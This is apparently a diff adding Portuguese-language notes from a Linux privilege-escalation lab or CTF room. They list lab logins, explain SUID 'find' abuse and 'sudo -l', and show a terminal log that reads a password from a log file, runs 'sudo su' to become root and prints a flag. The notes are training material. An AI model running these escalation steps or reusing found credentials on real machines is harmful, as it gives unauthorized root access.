@@ -1,0 +1,76 @@
+shiba1/shiba1
+
+shiba2/pinguftw
+
+shiba3/happynootnoises
+
+cd /etc/shiba3
+
+shiba4/test1234
+
+nootnoot:notsofast
+
+===================================================
+
+Escalacao de Privilegios Linux
+
+Procurar por arquivos do usuario que pode ser executado, lido ou escrito.
+Arquivos de executavel que pode ser usado para dar um terminal, como o /bin/find.
+Arquivos que podem ser lidos, /var/logs.
+Arquivos que pode ser escritos, /etc/passwd
+
+find / -user <username> -type f 2>>/dev/null
+
+Arquivos de log, podem ter informacoes como usuario e senhas.
+
+Arquivos find podem executar um shell:
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/find
+find raj -exec "whoami" \;
+
+Outra tecnica de escalacao de privilegios e do sudo:
+sudo -l
+
+Ira mostrar os $PATH que executam no sudo.
+Mostrara as permissoes de sudo que o usuario tem.
+
+==============================================================================
+
+shiba1@nootnoot:~$ find / -user shiba2 -type f 2>>/dev/null
+/var/log/test1234
+
+shiba1@nootnoot:~$ cat /var/log/test1234
+cat: /var/log/test1234: Permission denied
+
+shiba1@nootnoot:~$ ls -l /var/log/test1234
+-r--r----- 1 shiba2 shiba2 19 Feb 22  2020 /var/log/test1234
+
+shiba2@nootnoot:/home/shiba1$ cat /var/log/test1234
+nootnoot:notsofast
+
+nootnoot@nootnoot:/home/shiba1$ sudo -l
+[sudo] password for nootnoot: 
+Matching Defaults entries for nootnoot on nootnoot:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nootnoot may run the following commands on nootnoot:
+    (ALL : ALL) ALL
+
+nootnoot@nootnoot:/home/shiba1$ sudo su
+root@nootnoot:/home/shiba1# cd /root
+root@nootnoot:~# cat root.txt
+
+Flag: ad91979868d06e19d8e8a9c28be56e0c
+
+==================================================================================
+
+Refencias:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries
+https://medium.com/swlh/linux-privilege-escalation-in-four-ways-eedb52903b3
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+https://www.hackingarticles.in/lxd-privilege-escalation/
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/
+https://payatu.com/guide-linux-privilege-escalation
+https://www.secjuice.com/tryhackme-common-linux-privilege-escalation/
+https://medium.com/@ratiros01/tryhackme-learn-linux-dd9d02fee8b5
